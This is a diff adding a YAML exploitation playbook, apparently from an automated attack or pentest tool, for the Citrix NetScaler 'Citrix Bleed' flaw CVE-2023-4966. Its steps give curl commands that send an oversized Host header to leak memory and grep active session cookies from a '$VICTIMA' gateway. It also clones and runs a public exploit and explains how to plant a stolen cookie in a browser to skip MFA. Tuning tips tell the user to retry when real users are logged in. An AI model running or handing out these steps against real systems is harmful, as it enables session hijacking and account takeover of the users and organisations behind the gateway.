@@ -1,0 +1,58 @@
+chain_id: citrix_bleed_cve_2023_4966
+title: "Citrix NetScaler — CVE-2023-4966 'Citrix Bleed' session-token leak"
+severity: CRITICAL
+tags: [web, citrix, netscaler, cve-2023-4966, info-leak, session-hijack]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2023-4966" }
+    - { banner_pattern: "(?i)netscaler|citrix\\s*adc|citrix\\s*gateway" }
+    - { product_pattern: "(?i)netscaler" }
+    - { path_pattern: "(?i)/oauth/idp/.well-known/openid-configuration" }
+
+description: |
+  NetScaler ADC / Gateway 13.1 < 49.15, 14.1 < 8.50 (and earlier 13.0,
+  12.1) over-read process memory when an oversized `Host` header hits
+  `/oauth/idp/.well-known/openid-configuration` on a gateway configured
+  as VPN/AAA/ICA-proxy. Memory contains active session cookies — paste
+  one into the gateway and you skip MFA entirely. Mass-exploited by
+  LockBit late 2023.
+
+steps:
+  - id: 1
+    title: "Confirm gateway role"
+    command: |
+      curl -sk "https://$VICTIMA/oauth/idp/.well-known/openid-configuration" -I
+
+  - id: 2
+    title: "Leak memory until a session cookie surfaces"
+    command: |
+      curl -skv "https://$VICTIMA/oauth/idp/.well-known/openid-configuration" \
+        -H "Host: $(python3 -c 'print("a"*24812)')" 2>&1 | strings | grep -iE 'NSC_AAAC|NSC_TASS|NSC_TMAS'
+
+  - id: 3
+    title: "Public looped PoC"
+    command: |
+      git clone https://github.com/assetnote/exploits /tmp/citrixbleed
+      python3 /tmp/citrixbleed/citrix/CVE-2023-4966/exploit.py $VICTIMA
+
+  - id: 4
+    title: "Hijack — drop the cookie into the browser"
+    command: |
+      # In your browser, set on https://$VICTIMA:
+      #   NSC_AAAC=<leaked-value>
+      # Then visit /logon/LogonPoint/tmindex.html — already authenticated.
+
+common_errors:
+  - error: "Response is empty / no cookies in leaked bytes"
+    solution: |
+      The box has no active sessions to leak. Re-run during business
+      hours, or wait — bytes leak only after a real user authenticates.
+  - error: "Host header rejected (400)"
+    solution: |
+      Tune the padding length: 24812 is the most reliable, but some
+      builds need 24576 or 25000. Iterate by ±256.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-4966
+  - https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966
